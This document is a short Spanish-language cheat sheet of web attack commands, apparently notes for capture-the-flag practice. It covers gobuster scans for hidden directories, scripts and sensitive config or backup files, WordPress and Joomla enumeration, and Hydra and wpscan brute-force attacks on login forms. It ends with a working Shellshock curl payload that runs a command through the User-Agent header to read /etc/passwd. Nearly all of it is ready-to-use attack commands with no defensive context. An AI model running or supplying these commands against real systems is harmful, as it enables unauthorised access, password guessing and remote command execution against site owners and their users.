# HTTP
Protocolo de comunicación que permite las transferencias de información en la World Wide Web sirve como base para muchos otros servicios

## Enumeración
### Encontrar subdirectorios
```
gobuster -u URL -w wordlist
```
### Encontrar scripts ocultos
```
gobuster -u URL -w wordlist -x .js, .py, .phpX , .aspx , .sh
```
### Encontrar archivos que puedan contener información sensible
```
gobuster -u URL -w wordlist -x .txt, .conf , .config , .bak
```
### Enumera wordpress
```
wpscan --url -e vp,u,cb,dbe
```
### Enumerar joomla
```
perl joomscan.pl -u URL
```


## Ataques por fuerza bruta
### Wordpress login bruteforce
```
wpscan --url URL --wordlist DICTIONARYPATH --username USERNAME
```
### Hydra POST login
```
hydra -L USERLIST -P PASSLIST IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" 
```
### Hydra BruteForce HTTP GET
```
hydra -L UserList -P PassList IP http-get Directorio
```
## Vulnerabilidades comunes sin metasploit
### Shellshock cgi-bin
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://IP/cgi-bin/script.sh
```
